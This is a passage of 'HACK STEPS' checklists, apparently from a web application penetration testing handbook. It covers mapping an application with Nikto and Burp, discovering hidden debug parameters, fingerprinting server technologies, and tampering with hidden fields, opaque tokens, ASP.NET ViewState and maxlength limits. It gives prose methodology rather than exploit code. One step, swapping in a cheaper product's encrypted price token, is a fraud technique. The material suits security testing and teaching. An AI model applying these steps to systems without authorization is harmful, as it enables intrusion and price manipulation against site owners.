<li>Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet forums. Review any information found for clues about functionality or vulnerabilities within the target application.</li>
</ol>
<p>HACK STEPS</p>
<p>Several useful options are available when you run Nikto:</p>
<ol class="arabic simple">
<li>If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of /cgi-bin), you can specify this alternative location using the option –root /cgi/. For the specific case of CGI directories, these can also be specified using the option –Cgidirs.</li>
<li>If the site uses a custom “file not found” page that does not return the HTTP 404 status code, you can specify a particular string that identifies this page by using the -404 option.</li>
<li>Be aware that Nikto does not perform any intelligent verification of potential issues and therefore is prone to report false positives. Always check any results Nikto returns manually.</li>
</ol>
<p>Note that with tools like Nikto, you can specify a target application using its domain name or IP address. If a tool accesses a page using its IP address, the tool treats links on that page that use its domain name as belonging to a different domain, so the links are not followed. This is reasonable, because some applications are virtually hosted, with multiple domain names sharing the same IP address. Ensure that you conﬁ gure your tools with this fact in mind.</p>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a function in a parameter (such as /admin.jsp?action=editUser).</li>
<li>Modify the automated techniques described for discovering URL-specified content to work on the content-access mechanisms in use within the application. For example, if the application uses parameters that specify servlet and method names, first determine its behavior when an invalid servlet and/or method is requested, and when a valid method is requested with other invalid parameters. Try to identify attributes of the server’s responses that indicate “hits” — valid servlets and methods. If possible, find a way of attacking the problem in two stages, first enumerating servlets and then methods within these. Using a method similar to the one used for URL-specified content, compile lists of common items, add to these by inferring from the names actually observed, and generate large numbers of requests based on these.</li>
<li>If applicable, compile a map of application content based on functional paths, showing all the enumerated functions and the logical paths and dependencies between them.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Using lists of common debug parameter names (debug, test, hide, source, etc.) and common values (true, yes, on, 1, etc.), make a large number of requests to a known application page or function, iterating through all permutations of name and value. For POST requests, insert the added parameter to both the URL query string and the message body. Burp Intruder can be used to perform this test using multiple payload sets and the “cluster bomb” attack type (see Chapter 14 for more details).</li>
<li>Monitor all responses received to identify any anomalies that may indicate that the added parameter has had an effect on the application’s processing.</li>
<li>Depending on the time available, target a number of different pages or functions for hidden parameter discovery. Choose functions where it is most likely that developers have implemented debug logic, such as login, search, and file uploading and downloading.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Identify all entry points for user input, including URLs, query string parameters, POST data, cookies, and other HTTP headers processed by the application.</li>
</ol>
<p>2. Examine the query string format used by the application. If it does not employ the standard format described in Chapter
3, try to understand how parameters are being transmitted via the URL. Virtually all custom schemes still employ some variation on the name/value model, so try to understand how name/value pairs are being encapsulated into the nonstandard URLs you have identified. 3. Identify any out-of-bound channels via which user-controllable or other third-party data is being introduced into the application’s processing.
4. View the HTTP Server banner returned by the application. Note that in some cases, different areas of the application are handled by different back-end components, so different Server headers may be received.
6. Check for any other software identifiers contained within any custom HTTP headers or HTML source code comments.
7. Run the httprint tool to fingerprint the web server.
8. If fine-grained information is obtained about the web server and other components, research the software versions in use to identify any vulnerabilities that may be exploited to advance an attack (see Chapter 18).
9. Review your map of application URLs to identify any interesting-looking file extensions, directories, or other sub-sequences that may provide clues about the technologies in use on the server.
10. Review the names of all session tokens issued by the application to identify the technologies being used.
11. Use lists of common technologies, or Google, to establish which technologies may be in use on the server, or discover other websites and applications that appear to employ the same technologies.
12. Perform searches on Google for the names of any unusual cookies, scripts, HTTP headers, and the like that may belong to third-party software components. If you locate other applications in which the same components are being used, review these to identify any additional functionality and parameters that the components support, and verify whether these are also present in your target application. Note that third-party components may look and feel quite different in each implementation, due to branding customizations, but the core functionality, including script and parameter names, is often the same. If possible, download and install the component and analyze it to fully understand its capabilities and, if possible, discover any vulnerabilities. Consult repositories of known vulnerabilities to identify any known defects with the component in question.</p>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Review the names and values of all parameters being submitted to the application in the context of the functionality they support.</li>
<li>Try to think like a programmer, and imagine what server-side mechanisms and technologies are likely to have been used to implement the behavior you can observe.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Try to identify any locations within the application that may contain clues about the internal structure and functionality of other areas.</li>
<li>It may not be possible to draw any firm conclusions here; however, the cases identified may prove useful at a later stage of the attack when you’re attempting to exploit any potential vulnerabilities.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application.</li>
<li>Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage tracking, and third-party code.</li>
<li>Perform a full review of these areas, and do not assume that the standard defenses used elsewhere in the application apply.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Understand the core functionality implemented within the application and the main security mechanisms in use.</li>
<li>Identify all features of the application’s functionality and behavior that are often associated with common vulnerabilities.</li>
<li>Check any third-party code against public vulnerability databases such as www.osvdb.org to determine any known issues.</li>
<li>Formulate a plan of attack, prioritizing the most interesting-looking functionality and the most serious of the associated potential vulnerabilities.</li>
</ol>

<div class="section" id="id3">
<h2>Bypassing Client-Side Controls<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Locate all instances within the application where hidden form fields, cookies, and URL parameters are apparently being used to transmit data via the client.</li>
<li>Attempt to determine or guess the role that the item plays in the application’s logic, based on the context in which it appears and on clues such as the parameter’s name.</li>
<li>Modify the item’s value in ways that are relevant to its purpose in the application. Ascertain whether the application processes arbitrary values submitted in the parameter, and whether this exposes the application to any vulnerabilities.</li>
</ol>
<p>HACK STEPS</p>
<p>Faced with opaque data being transmitted via the client, several avenues of attack are possible:</p>
<ol class="arabic simple">
<li>If you know the value of the plaintext behind the opaque string, you can attempt to decipher the obfuscation algorithm being employed.</li>
<li>As described in Chapter 4, the application may contain functions elsewhere that you can leverage to return the opaque string resulting from a piece of plaintext you control. In this situation, you may be able to directly obtain the required string to deliver an arbitrary payload to the function you are targeting.</li>
<li>Even if the opaque string is impenetrable, it may be possible to replay its value in other contexts to achieve a malicious effect. For example, the pricing_token parameter in the previously shown form may contain an encrypted version of the product’s price. Although it is not possible to produce the encrypted equivalent for an arbitrary price of your choosing, you may be able to copy the encrypted price from a different, cheaper product and submit this in its place.</li>
<li>If all else fails, you can attempt to attack the server-side logic that will decrypt or deobfuscate the opaque string by submitting malformed variations of it — for example, containing overlong values, different character sets, and the like</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you can use the ViewState parser in Burp Suite to confirm whether this is present.</li>
<li>Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client.</li>
<li>Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results.</li>
<li>If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data. Try to submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted via the client.</li>
<li>Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.</li>
</ol>
<p>HACK STEPS</p>
<ol class="arabic simple">
<li>Look for form elements containing a maxlength attribute. Submit data that is longer than this length but that is formatted correctly in other respects (for example, it is numeric if the application expects a number).</li>
<li>If the application accepts the overlong data, you may infer that the clientside validation is not replicated on the server.</li>
<li>Depending on the subsequent processing that the application performs on the parameter, you may be able to leverage the defects in validation to exploit other vulnerabilities, such as SQL injection, cross-site scripting, or buffer overflows.</li>
